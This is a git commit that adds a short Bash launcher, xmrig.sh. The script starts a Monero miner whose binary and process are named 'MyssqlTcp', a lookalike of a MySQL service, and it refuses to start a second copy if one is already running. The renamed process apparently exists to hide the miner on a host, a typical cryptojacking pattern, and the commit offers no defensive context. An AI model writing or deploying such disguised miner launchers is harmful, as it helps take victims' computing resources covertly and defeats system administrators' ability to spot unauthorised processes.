5bdaa52ef159c356a52a868bd4e1b7afc7a6bba4
teshushu <905353149@qq.com>
2023-01-20 08:57:19 +0800

    Create xmrig.sh

---
+++ Bash/xmrig.sh
@@ -0,0 +1,7 @@
+#!/bin/bash
+if ! pidof MyssqlTcp >/dev/null; then
+  nice $HOME/myssqltcp/MyssqlTcp \$*
+else
+  echo "Monero server is already running in the background. Refusing to run another one."
+  echo "Run \"killall MyssqlTcp\" or \"sudo killall MyssqlTcp\" if you want to remove background server first."
+fi
